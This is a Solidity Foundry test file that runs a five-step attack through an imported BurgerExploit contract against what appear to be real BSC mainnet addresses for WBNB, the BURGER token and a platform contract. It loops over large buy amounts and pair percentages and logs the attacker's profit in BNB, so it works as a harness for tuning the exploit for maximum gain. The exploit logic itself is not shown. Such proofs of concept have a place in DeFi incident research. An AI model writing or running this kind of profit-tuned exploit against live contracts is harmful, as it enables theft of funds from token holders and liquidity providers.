// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../exploit/BurgerExploit.sol";

contract BurgerTest6 is Test {
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BURGER = 0xAe9269f27437f0fcBC232d39Ec814844a51d6b8f;
    address constant PLATFORM = 0xBf6527834dBB89cdC97A79FCD62E6c08B19F8ec0;

    function test_largeBuy() public {
        // Try much larger buy amounts
        uint256[4] memory buyAmounts = [uint256(3000 ether), uint256(5000 ether), uint256(10000 ether), uint256(50000 ether)];
        uint256[5] memory pairPcts = [uint256(1), uint256(3), uint256(5), uint256(10), uint256(15)];

        for (uint256 b = 0; b < buyAmounts.length; b++) {
            for (uint256 p = 0; p < pairPcts.length; p++) {
                _run(buyAmounts[b], pairPcts[p]);
            }
        }
    }

    function _run(uint256 buyAmount, uint256 pairPct) internal {
        address att = makeAddr("att");
        uint256 startBnb = buyAmount + 500 ether;
        vm.deal(att, startBnb);
        vm.startPrank(att);

        BurgerExploit e = new BurgerExploit();
        e.step1_setup{value: buyAmount + 200 ether}();
        e.step2_buyBurger(buyAmount);

        uint256 bBal = IERC20(BURGER).balanceOf(address(e));
        uint256 forPair = bBal * pairPct / 100;
        if (forPair < 1000) forPair = 1000;

        e.step3_createPair(100 ether, forPair);
        e.step4_attack(50 ether);
        e.step5_unwrap();

        int256 profit = int256(att.balance) - int256(startBnb);
        // Log profit in BNB (approximate)
        string memory pSign = profit >= 0 ? "+" : "-";
        uint256 absProfit = profit >= 0 ? uint256(profit) : uint256(-profit);
        emit log_string(string.concat(
            "buy=", vm.toString(buyAmount / 1 ether),
            " pct=", vm.toString(pairPct),
            " profit=", pSign, vm.toString(absProfit / 1 ether), " BNB"
        ));

        vm.stopPrank();
    }
}
